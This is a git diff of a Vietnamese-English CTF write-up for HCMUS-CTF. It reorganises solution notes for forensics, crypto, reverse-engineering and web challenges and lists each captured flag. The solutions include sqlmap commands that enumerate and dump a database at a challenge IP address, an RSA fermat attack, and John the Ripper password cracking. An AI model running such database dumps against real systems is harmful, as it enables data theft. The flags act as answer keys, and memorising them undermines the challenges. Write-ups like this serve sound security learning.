@@ -70,7 +70,7 @@ sudo docker run -it pakkunady/docker-babe:latest /bin/bash
 - Move to root and ls to view all files and we see flag.txt  :))))
 - cat flag.txt and see the flag
  
-  	Flag: HCMUS-CTF{Docker_Is_an_essential_tool_You_have_to_learn_FORRRRSURRREEEE}
+        Flag: HCMUS-CTF{Docker_Is_an_essential_tool_You_have_to_learn_FORRRRSURRREEEE}
 
 ### Crime
 - Mở file .001 bằng 7zip
@@ -182,7 +182,10 @@ sudo docker run -it pakkunady/docker-babe:latest /bin/bash
 - Sử dụng hàm này
 	def str_xor(s1, s2): 
     return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])
-![Smalle2](./sources/Smalle2.gif)
+    
+![Smalle2](./sources/smalle2.gif)
+
+
 - Mà em nộp thì nó bảo sai, em xoá hết chữ z thì nó đúng.
    
         Flag: HCMUS-CTF{hello_from_the_other_side}
@@ -197,7 +200,6 @@ sudo docker run -it pakkunady/docker-babe:latest /bin/bash
 
         Flag: HCMUS-CTF{Use_John_the_ripper_to_crack_password_is_fun!!!HAHAHA}
 
-## REVERSE ENGINEERING
 ### Factorization Revenge
 - ./RsaCtftool.py -n .. -c -e –attack fermat	 
 
@@ -206,6 +208,8 @@ sudo docker run -it pakkunady/docker-babe:latest /bin/bash
 
         Flag: HCMUS-CTF{haaaaah_what_do_you_really_want_from_meeeeeee}
 
+
+## REVERSE ENGINEERING
 ### PatientRevenge
 - Autoclick
 
@@ -232,12 +236,43 @@ sudo docker run -it pakkunady/docker-babe:latest /bin/bash
 ![stackstring](./sources/stackstring.gif)
 
 
-	Flag: HCMUS-CTF{St4cK_Str1ng_G00D_old_techn1qu3}
+        Flag: HCMUS-CTF{St4cK_Str1ng_G00D_old_techn1qu3}
 
 ### Patient
 - Xài auto click
 
-	Flag: HCMUS-CTF{W0W_y0u_are_p4tient}
+        Flag: HCMUS-CTF{W0W_y0u_are_p4tient}
+	
+### Z3
+ 
+- Đầu tiên lấy Pesudo Code từ trong Ghidra và sửa lại (thay thế các flag[0-35] lần lượt thành x0-x35)
+
+![Z3](./sources/z3.gif)
+
+
+- Sử dụng tool z3 giải được x0-35
+
+![Z31](./sources/z31.gif)
+
+
+- Sử dụng code in kết quả vào file
+
+![Z32](./sources/z32.gif)
+
+
+- Chỉnh tay bằng công cụ find & replace
+
+![z33](./sources/z33.gif)
+
+
+- Sau đó code python để tự động in ra flag
+
+![z34](./sources/z34.gif)
+
+
+    Flag: HCMUS-CTF{H4v3_y0u_ev3r_he4rd_0f_z3}
+
+
 
 
 
@@ -313,16 +348,19 @@ Add referrer to the package.
 ![Blindsql](./sources/Blindsql.gif)
 - Sử dụng lệnh này
     ./sqlmap.py http://159.65.13.76:1340/ --data="username=admin" --dbs
-	 
+    
+![Blindsql1](./sources/blindsql1.gif)    
+
+
 	./sqlmap.py -u http://159.65.13.76:1340/ --data="username=admin" --table -D blind-sql
 	Tìm dược bảng account
-	
-![Blindsql1](./sources/Blindsql1.gif)
+
+![Blindsql2](./sources/blindsql2.gif)	 
 	 
 	 
 	./sqlmap.py -u http://159.65.13.76:1340/ --data="username=admin" --dump -D blind-sql -T account 
 	
-![Blindsql2](./sources/Blindsql2.gif)
+![Blindsql3](./sources/blindsql3.gif)
 
 
 	Flag: HCMUS-CTF{Sh0uld_I_Us3_NoSQL_N3xt_T1m3_0x3f3f3f}
@@ -368,10 +406,6 @@ Add referrer to the package.
 
 
 	Flag: HCMUS-CTF{You_have_to_learn_basic_stack_based_buffer_overflow}
-
-### Z3
-
-	Flag: HCMUS-CTF{H4v3_y0u_ev3r_he4rd_0f_z3}
 
 
 	
